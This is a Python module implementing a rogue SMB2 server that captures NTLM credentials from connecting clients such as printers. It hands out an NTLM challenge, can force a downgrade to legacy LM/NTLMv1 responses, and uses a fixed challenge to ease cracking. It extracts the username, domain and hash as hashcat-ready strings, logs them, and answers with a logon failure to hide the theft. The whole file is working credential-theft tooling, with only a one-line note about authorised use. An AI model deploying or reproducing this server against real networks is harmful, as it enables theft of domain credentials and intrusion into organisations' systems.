#!/usr/bin/env python3

"""
SMBServer - a rogue/evil SMB server for capturing NTLM credentials.

This module implements a minimal SMB2 server that is just functional enough to
make an SMB client (for example a multifunction printer using "Scan to SMB" /
"Scan to network folder") perform an NTLM authentication against it. The server
hands the client an NTLM challenge and captures the resulting NTLM
authenticate message, from which it extracts the username, domain and the
NetNTLMv1/NetNTLMv2 response. The captured response is logged in a format that
can be cracked offline with hashcat (mode 5500 for NetNTLMv1, 5600 for
NetNTLMv2) or John the Ripper.

This complements the SMTP capture functionality of MITMsmtp: many devices that
can be pointed at a rogue SMTP server (printers, scanners, appliances) can also
be pointed at a rogue SMB share, and the SMB authentication often exposes
domain credentials.

It intentionally does NOT implement file sharing. After credentials are
captured the session is closed with a logon failure so the client simply
reports that the share is unavailable.

Legal/Ethical use only: run this against systems you own or are explicitly
authorised to test.
"""

import os
import struct
import time
import binascii
import threading
from datetime import datetime
from socketserver import TCPServer, ThreadingMixIn, BaseRequestHandler

# SMB2 command codes
SMB2_NEGOTIATE = 0x0000
SMB2_SESSION_SETUP = 0x0001

# NT status codes
STATUS_SUCCESS = 0x00000000
STATUS_MORE_PROCESSING_REQUIRED = 0xC0000016
STATUS_LOGON_FAILURE = 0xC000006D

# SMB2 dialect revisions
SMB2_DIALECT_WILDCARD = 0x02FF  # forces client to send an SMB2 negotiate
SMB2_DIALECT_0202 = 0x0202      # SMB 2.0.2

# SPNEGO / NTLMSSP object identifiers (already DER encoded with tag+length)
_SPNEGO_OID = bytes([0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02])
_NTLMSSP_OID = bytes([0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a])

# NTLM negotiate flags advertised in our challenge. The important ones are
# UNICODE, NTLM, EXTENDED_SESSIONSECURITY and TARGET_INFO so that the client
# replies with an NTLMv2 response.
_NTLM_CHALLENGE_FLAGS = (
    0x00000001 |  # NTLMSSP_NEGOTIATE_UNICODE
    0x00000004 |  # NTLMSSP_REQUEST_TARGET
    0x00000200 |  # NTLMSSP_NEGOTIATE_NTLM
    0x00008000 |  # NTLMSSP_NEGOTIATE_ALWAYS_SIGN
    0x00010000 |  # NTLMSSP_TARGET_TYPE_DOMAIN
    0x00080000 |  # NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
    0x00800000 |  # NTLMSSP_NEGOTIATE_TARGET_INFO
    0x02000000    # NTLMSSP_NEGOTIATE_VERSION
)

# Flags advertised when forcing an LM/NTLMv1 downgrade. Dropping
# EXTENDED_SESSIONSECURITY and TARGET_INFO makes clients fall back to the
# legacy LMv1/NTLMv1 responses (24-byte LM + NT), exposing a much weaker LM
# response that can be cracked as an LM hash.
_NTLM_CHALLENGE_FLAGS_LM_DOWNGRADE = (
    0x00000001 |  # NTLMSSP_NEGOTIATE_UNICODE
    0x00000004 |  # NTLMSSP_REQUEST_TARGET
    0x00000200 |  # NTLMSSP_NEGOTIATE_NTLM
    0x00008000 |  # NTLMSSP_NEGOTIATE_ALWAYS_SIGN
    0x00010000 |  # NTLMSSP_TARGET_TYPE_DOMAIN
    0x02000000    # NTLMSSP_NEGOTIATE_VERSION
)


def _der_len(length):
    """DER-encode an ASN.1 length."""
    if length < 0x80:
        return bytes([length])
    out = b""
    while length:
        out = bytes([length & 0xFF]) + out
        length >>= 8
    return bytes([0x80 | len(out)]) + out


def _der(tag, content):
    """Wrap content in a DER tag-length-value triple."""
    return bytes([tag]) + _der_len(len(content)) + content


def _filetime_now():
    """Current time as a Windows FILETIME (100ns intervals since 1601)."""
    return int((time.time() + 11644473600) * 10000000)


def _spnego_negtokeninit():
    """Build the SPNEGO negTokenInit advertising NTLMSSP for the negotiate response."""
    mech_list = _der(0x30, _NTLMSSP_OID)          # MechTypeList SEQUENCE
    mech_types = _der(0xA0, mech_list)            # [0] mechTypes
    negtokeninit = _der(0x30, mech_types)         # NegTokenInit SEQUENCE
    tagged = _der(0xA0, negtokeninit)             # [0] negTokenInit
    inner = _SPNEGO_OID + tagged
    return _der(0x60, inner)                      # [APPLICATION 0] GSSAPI token


def _spnego_negtokenresp(ntlm_token):
    """Wrap an NTLMSSP challenge token in a SPNEGO negTokenResp (accept-incomplete)."""
    neg_state = _der(0xA0, _der(0x0A, b"\x01"))             # [0] negState = accept-incomplete
    supported_mech = _der(0xA1, _NTLMSSP_OID)              # [1] supportedMech
    response_token = _der(0xA2, _der(0x04, ntlm_token))    # [2] responseToken OCTET STRING
    seq = _der(0x30, neg_state + supported_mech + response_token)
    return _der(0xA1, seq)                                 # [1] negTokenResp


def _av_pair(av_id, value):
    return struct.pack("<HH", av_id, len(value)) + value


def build_ntlm_challenge(server_challenge, target_name, force_lm=False):
    """Build an NTLMSSP CHALLENGE (Type 2) message.

    @param server_challenge: 8-byte server challenge
    @param target_name: NetBIOS/domain name advertised to the client
    @param force_lm: When True, advertise downgraded flags and omit the target
                     info so the client replies with a legacy LMv1/NTLMv1
                     response (lets you capture an LM hash).
    @return: raw NTLMSSP challenge bytes
    """
    target_unicode = target_name.encode("utf-16-le")

    if force_lm:
        flags = _NTLM_CHALLENGE_FLAGS_LM_DOWNGRADE
        # No TargetInfo when forcing the legacy downgrade.
        av_pairs = b""
    else:
        flags = _NTLM_CHALLENGE_FLAGS
        # Target info AV pairs (used by the client to build the NTLMv2 response)
        av_pairs = (
            _av_pair(2, target_unicode) +   # MsvAvNbDomainName
            _av_pair(1, target_unicode) +   # MsvAvNbComputerName
            _av_pair(4, target_unicode) +   # MsvAvDnsDomainName
            _av_pair(3, target_unicode) +   # MsvAvDnsComputerName
            _av_pair(0, b"")                # MsvAvEOL
        )

    # The payload follows a fixed-size header. The header is 56 bytes when the
    # optional Version field (8 bytes) is included.
    payload_offset = 56
    target_name_offset = payload_offset
    target_info_offset = target_name_offset + len(target_unicode)

    msg = b"NTLMSSP\x00"
    msg += struct.pack("<I", 0x00000002)  # MessageType = CHALLENGE
    # TargetName fields
    msg += struct.pack("<HHI", len(target_unicode), len(target_unicode), target_name_offset)
    msg += struct.pack("<I", flags)
    msg += server_challenge                # ServerChallenge (8 bytes)
    msg += b"\x00" * 8                      # Reserved
    # TargetInfo fields
    msg += struct.pack("<HHI", len(av_pairs), len(av_pairs), target_info_offset)
    # Version (NTLMSSP_NEGOTIATE_VERSION is set): 6.1 build 7601, NTLM revision 15
    msg += struct.pack("<BBHxxxB", 6, 1, 7601, 15)
    # Payload
    msg += target_unicode
    msg += av_pairs
    return msg


def parse_ntlm_authenticate(msg, server_challenge):
    """Parse an NTLMSSP AUTHENTICATE (Type 3) message.

    @param msg: raw NTLMSSP authenticate bytes (starting at the signature)
    @param server_challenge: the 8-byte challenge we sent
    @return: dict with username, domain, workstation, ntlm version and the
             formatted hashcat/john credential string, or None on parse error.
    """
    try:
        def field(off):
            length, _maxlen, offset = struct.unpack_from("<HHI", msg, off)
            return msg[offset:offset + length]

        lm_response = field(12)
        nt_response = field(20)
        domain = field(28).decode("utf-16-le", errors="replace")
        username = field(36).decode("utf-16-le", errors="replace")
        workstation = field(44).decode("utf-16-le", errors="replace")

        challenge_hex = binascii.hexlify(server_challenge).decode("ascii")

        if len(nt_response) > 24:
            # NetNTLMv2
            nt_proof = binascii.hexlify(nt_response[:16]).decode("ascii")
            blob = binascii.hexlify(nt_response[16:]).decode("ascii")
            credential = "%s::%s:%s:%s:%s" % (
                username, domain, challenge_hex, nt_proof, blob)
            version = "NetNTLMv2"
            hashcat_mode = 5600
        else:
            # NetNTLMv1
            lm_hex = binascii.hexlify(lm_response).decode("ascii")
            nt_hex = binascii.hexlify(nt_response).decode("ascii")
            credential = "%s::%s:%s:%s:%s" % (
                username, domain, lm_hex, nt_hex, challenge_hex)
            version = "NetNTLMv1"
            hashcat_mode = 5500

        return {
            "username": username,
            "domain": domain,
            "workstation": workstation,
            "version": version,
            "hashcat_mode": hashcat_mode,
            "credential": credential,
        }
    except Exception:
        return None


def build_smb2_header(command, message_id, session_id=0, status=STATUS_SUCCESS, credits=1):
    """Build a 64-byte SMB2 response header."""
    header = b"\xfeSMB"
    header += struct.pack("<H", 64)            # StructureSize
    header += struct.pack("<H", 0)             # CreditCharge
    header += struct.pack("<I", status)        # Status
    header += struct.pack("<H", command)       # Command
    header += struct.pack("<H", credits)       # CreditResponse
    header += struct.pack("<I", 0x00000001)    # Flags = SERVER_TO_REDIR (response)
    header += struct.pack("<I", 0)             # NextCommand
    header += struct.pack("<Q", message_id)    # MessageId
    header += struct.pack("<I", 0)             # Reserved (ProcessId)
    header += struct.pack("<I", 0)             # TreeId
    header += struct.pack("<Q", session_id)    # SessionId
    header += b"\x00" * 16                      # Signature
    return header


class _SMBRequestHandler(BaseRequestHandler):
    """Per-connection SMB2 handler driving the NTLM challenge/response capture."""

    def handle(self):
        server = self.server.smb_config
        client_ip = self.client_address[0]
        if server.print_smb:
            print("[SMB] New connection from %s" % client_ip)

        session_id = 0
        try:
            while True:
                data = self._read_packet()
                if data is None:
                    break

                # SMB1 (legacy) negotiate: reply with an SMB2 wildcard negotiate so
                # the client retries using SMB2.
                if data[:4] == b"\xffSMB":
                    self._send_negotiate(message_id=0, dialect=SMB2_DIALECT_WILDCARD)
                    continue

                if data[:4] != b"\xfeSMB":
                    # Unknown protocol; nothing more we can do.
                    break

                command = struct.unpack_from("<H", data, 12)[0]
                message_id = struct.unpack_from("<Q", data, 24)[0]
                req_session_id = struct.unpack_from("<Q", data, 40)[0]

                if command == SMB2_NEGOTIATE:
                    self._send_negotiate(message_id=message_id, dialect=SMB2_DIALECT_0202)

                elif command == SMB2_SESSION_SETUP:
                    ntlm_index = data.find(b"NTLMSSP\x00")
                    if ntlm_index == -1:
                        break
                    ntlm_msg = data[ntlm_index:]
                    msg_type = struct.unpack_from("<I", ntlm_msg, 8)[0]

                    if msg_type == 1:
                        # NEGOTIATE -> reply with our CHALLENGE
                        if session_id == 0:
                            session_id = int.from_bytes(os.urandom(8), "little") or 1
                        self._send_challenge(message_id, session_id)
                    elif msg_type == 3:
                        # AUTHENTICATE -> capture the credentials
                        result = parse_ntlm_authenticate(ntlm_msg, server.challenge)
                        if result:
                            server.report_capture(client_ip, result)
                        # Tell the client the logon failed and end the session.
                        self._send_session_setup(
                            message_id, req_session_id or session_id,
                            status=STATUS_LOGON_FAILURE, payload=b"")
                        break
                    else:
                        break
                else:
                    # We do not implement tree connect / file ops.
                    break
        except (ConnectionError, OSError):
            pass
        except Exception as e:
            if server.print_smb:
                print("[SMB ERROR] %s: %s" % (client_ip, e))

    def _read_packet(self):
        """Read one NetBIOS-framed SMB message. Returns None on disconnect."""
        header = self._recv_exact(4)
        if header is None:
            return None
        length = struct.unpack(">I", header)[0] & 0x00FFFFFF
        if length == 0:
            return b""
        return self._recv_exact(length)

    def _recv_exact(self, count):
        buf = b""
        while len(buf) < count:
            chunk = self.request.recv(count - len(buf))
            if not chunk:
                return None
            buf += chunk
        return buf

    def _send_packet(self, data):
        nb = struct.pack(">I", len(data) & 0x00FFFFFF)
        self.request.sendall(nb + data)

    def _send_negotiate(self, message_id, dialect):
        server = self.server.smb_config
        secbuf = _spnego_negtokeninit()

        body = struct.pack("<H", 65)               # StructureSize
        body += struct.pack("<H", 1)               # SecurityMode = signing enabled
        body += struct.pack("<H", dialect)         # DialectRevision
        body += struct.pack("<H", 0)               # NegotiateContextCount/Reserved
        body += server.server_guid                 # ServerGuid (16 bytes)
        body += struct.pack("<I", 0)               # Capabilities
        body += struct.pack("<I", 0x00100000)      # MaxTransactSize
        body += struct.pack("<I", 0x00100000)      # MaxReadSize
        body += struct.pack("<I", 0x00100000)      # MaxWriteSize
        body += struct.pack("<Q", _filetime_now()) # SystemTime
        body += struct.pack("<Q", 0)               # ServerStartTime
        sec_offset = 64 + 64                        # header + fixed body
        body += struct.pack("<H", sec_offset)      # SecurityBufferOffset
        body += struct.pack("<H", len(secbuf))     # SecurityBufferLength
        body += struct.pack("<I", 0)               # NegotiateContextOffset/Reserved2
        body += secbuf

        header = build_smb2_header(SMB2_NEGOTIATE, message_id)
        self._send_packet(header + body)

    def _send_challenge(self, message_id, session_id):
        server = self.server.smb_config
        ntlm = build_ntlm_challenge(
            server.challenge, server.target_name, force_lm=server.force_lm_downgrade)
        secbuf = _spnego_negtokenresp(ntlm)
        self._send_session_setup(
            message_id, session_id,
            status=STATUS_MORE_PROCESSING_REQUIRED, payload=secbuf)

    def _send_session_setup(self, message_id, session_id, status, payload):
        body = struct.pack("<H", 9)                # StructureSize
        body += struct.pack("<H", 0)               # SessionFlags
        sec_offset = 64 + 8                          # header + fixed body
        body += struct.pack("<H", sec_offset if payload else 0)  # SecurityBufferOffset
        body += struct.pack("<H", len(payload))    # SecurityBufferLength
        body += payload

        header = build_smb2_header(
            SMB2_SESSION_SETUP, message_id, session_id=session_id, status=status)
        self._send_packet(header + body)


class _ThreadedTCPServer(ThreadingMixIn, TCPServer):
    allow_reuse_address = True
    daemon_threads = True


class SMBServer:
    """
    Rogue SMB server that captures NTLM credentials from connecting clients.
    """

    def __init__(self,
                 listen_address="0.0.0.0",
                 listen_port=445,
                 challenge="1122334455667788",
                 target_name="WORKGROUP",
                 log_dir=None,
                 print_smb=False,
                 force_lm_downgrade=False,
                 capture_callback=None):
        """
        @param listen_address: IP address to bind to
        @param listen_port: TCP port to listen on (445 standard, needs root)
        @param challenge: 16 hex character (8 byte) server challenge. A fixed
                          challenge allows the use of precomputed tables.
        @param target_name: NetBIOS/domain name advertised to the client
        @param log_dir: Directory to append captured hashes to (smb_credentials.log)
        @param print_smb: Print SMB protocol activity
        @param force_lm_downgrade: Advertise downgraded NTLM flags to force
                          clients into a legacy LMv1/NTLMv1 response (captures
                          a weaker LM hash).
        @param capture_callback: Optional callable(client_ip, result_dict)
        """
        self.listen_address = listen_address
        self.listen_port = listen_port
        self.target_name = target_name
        self.log_dir = log_dir
        self.print_smb = print_smb
        self.force_lm_downgrade = force_lm_downgrade
        self.capture_callback = capture_callback
        self.server_guid = os.urandom(16)

        try:
            self.challenge = binascii.unhexlify(challenge)
        except (binascii.Error, ValueError):
            raise ValueError("SMB challenge must be hex characters")
        if len(self.challenge) != 8:
            raise ValueError("SMB challenge must be exactly 8 bytes (16 hex characters)")

        self.server = None
        self.thread = None

    def start(self):
        """Start the SMB server in a background thread."""
        if self.server is not None:
            raise ValueError("SMB server is already running")

        self.server = _ThreadedTCPServer(
            (self.listen_address, self.listen_port), _SMBRequestHandler)
        self.server.smb_config = self
        self.thread = threading.Thread(target=self.server.serve_forever)
        self.thread.daemon = True
        self.thread.start()

        print("[SMB] SMB server started on %s:%d" % (self.listen_address, self.listen_port))
        print("[SMB] Advertising target name: %s" % self.target_name)
        print("[SMB] Server challenge: %s" % binascii.hexlify(self.challenge).decode("ascii"))
        if self.force_lm_downgrade:
            print("[SMB] Force LM downgrade enabled: requesting legacy LMv1/NTLMv1 responses")

    def stop(self):
        """Stop the SMB server."""
        if self.server is not None:
            self.server.shutdown()
            self.server.server_close()
            if self.thread:
                self.thread.join(timeout=2)
            self.server = None
            self.thread = None
            print("[SMB] SMB server stopped")

    def report_capture(self, client_ip, result):
        """Print, log and dispatch a captured NTLM credential."""
        print("[SMB] *** %s HASH CAPTURED *** from %s" % (result["version"], client_ip))
        print("[SMB] User: %s\\%s (workstation: %s)" % (
            result["domain"], result["username"], result["workstation"]))
        print("[SMB] %s (hashcat -m %d)" % (result["version"], result["hashcat_mode"]))
        print("[SMB] %s" % result["credential"])

        if self.log_dir is not None:
            try:
                with open(os.path.join(self.log_dir, "smb_credentials.log"), "a+") as log:
                    log.write("[%s] %s - %s - %s\n" % (
                        datetime.now().strftime("%d.%m.%Y %H:%M:%S"),
                        client_ip,
                        result["version"],
                        result["credential"]))
            except Exception as e:
                print("[SMB ERROR] Failed to write log: %s" % e)

        if self.capture_callback is not None:
            try:
                self.capture_callback(client_ip, result)
            except Exception as e:
                print("[SMB ERROR] capture callback failed: %s" % e)
